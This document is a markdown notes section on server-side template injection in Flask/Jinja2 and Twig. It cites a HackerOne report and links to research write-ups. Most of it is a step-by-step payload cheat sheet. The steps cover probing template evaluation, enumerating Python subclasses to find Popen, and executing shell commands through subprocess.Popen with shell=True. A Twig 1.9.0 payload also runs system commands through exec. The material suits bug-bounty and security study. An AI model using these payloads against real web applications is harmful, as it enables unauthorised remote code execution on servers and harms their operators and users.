# **Server Side Template Injection:**
  
- In this section I will place some links on some report from hackerone on how a researcher was able to identify an SSTI in a flask application that allowed him to get Remote Code Execution.
- [HackerOne Report by Orange Tsai](https://hackerone.com/reports/125980) in this report explains how he was able to identify an SSTI from just changing the profile name to {{'7'*7}} and received an email saying he updated his name to '7777777' this means that the server is processing the user input. Hence from there he was able know that it was a Flask Template Engine(Jinja2) application and he was able to inject code that would allow him to attain Remote Code Execution.

  - Python has so many ways of running commands using classes like subprocess or os.
  - Below are some payloads one can use when you meet a Flask Application.
    - **Payloads:**
      - To test if the flask application is processing user input one can use this: **`{{'7'*7}}`**
      - To identify the classes one can use this: **`{{''.__class__.mro()[2].__subclasses__()}}`** then follow the below instructions. (If the payload doesn't provide any output you can play around with the number. It's a trial and error basis.)
        - Expected output: ![image](https://user-images.githubusercontent.com/29776892/82662194-199b5a00-9c36-11ea-8eb1-85a2f683c9c6.png)
        - Then copy the output inside `vi` or `sublime-text`
        - Then use the below in `vi` to clean the output where you are basically replacing the greater than with an end of line return cariage. (This will set each class which is represented as such `<class-name>`) And then set numbers to identity the class number because in the next payload we are calling the class through it's number.
        `:%s />/\r/g` && `:set number`
        - After cleaning the code, you can proceed and search for `popen` a [python class](https://docs.python.org/2.4/lib/node239.html)
    - Use this payload to call the Popen class, where `X` is the number of the class. **`{{''.__class__.mro()[2].__subclasses__()[X]}}`** **Note:** that the numbering of array in most programming languages start at `Zero`.
      - **Note:** Also do note that you can use `os.popen` Method or `subprocess.Popen`.
    - Use this payload to execute commands: **`{{''.__class__.mro()[2].__subclasses__()[233]("commands", shell=True,stdout=-1).communicate()[0]}}`**

    &nbsp;

    - Resources to read on the above:
      - [Python Subprocess Management](https://docs.python.org/3/library/subprocess.html)
      - [Orange Tsai Blog on the bug - Use google translator extension](http://blog.orange.tw/2016/04/bug-bounty-uber-ubercom-remote-code_7.html)
      - [Server-Side Template Injection:RCE for the modern webapp](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
      - [Use Python features to execute arbitrary code in Jinja2 templates - Use google translator extension](https://blog.knownsec.com/2016/02/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/)
      - [Exploring SSTI in Flask/Jinja2 Part1](https://web.archive.org/web/20160309173230/https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/)
      - [Exploring SSTI in Flask/Jinja2 Part2](https://web.archive.org/web/20170710015954/https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
      - [CSAW-CTF Python sandbox write-up](https://hexplo.it/post/escaping-the-csawctf-python-sandbox/)

    &nbsp;

    - This payload can mainly be used to perform an SSTI in an old version of Twig version 1.9.0. (I would love to mention that to get such a payload one would have to read the documents and understand how the application template process code. :smile:)
      - **Payload:** `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}`